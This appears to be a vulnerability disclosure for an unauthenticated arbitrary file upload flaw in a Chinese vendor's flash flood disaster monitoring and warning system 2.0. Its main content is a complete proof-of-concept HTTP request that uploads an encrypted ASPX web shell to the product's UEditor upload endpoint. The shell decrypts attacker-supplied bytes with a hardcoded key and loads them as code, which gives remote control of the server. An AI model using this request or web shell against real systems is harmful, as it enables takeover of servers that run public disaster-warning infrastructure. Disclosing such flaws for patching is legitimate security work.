Flash flood disaster monitoring and warning system 2.0 has arbitrary file upload vulnerability

official website：http://www.cdwanjiang.com/

version：2.0

Chengdu Wanjiang Gangli Technology Co., LTD. - Mountain flood disaster monitoring and early warning system 2.0 has a serious arbitrary file upload vulnerability, which can obtain server permissions without authorization.


POC
```
POST /App_Resource/UEditor/server/upload.aspx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 541

------WebKitFormBoundaryJa5U4zOAfmJDcYxj
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
------WebKitFormBoundaryJa5U4zOAfmJDcYxj--
```


![WPS图片(1)](https://github.com/RCEraser/cve/assets/131632691/6690e5d0-cf55-46f9-9f51-ee5b527aad68)
![WPS图片(2)](https://github.com/RCEraser/cve/assets/131632691/b36b9817-fed1-4808-8400-00f2ed7d2aaa)
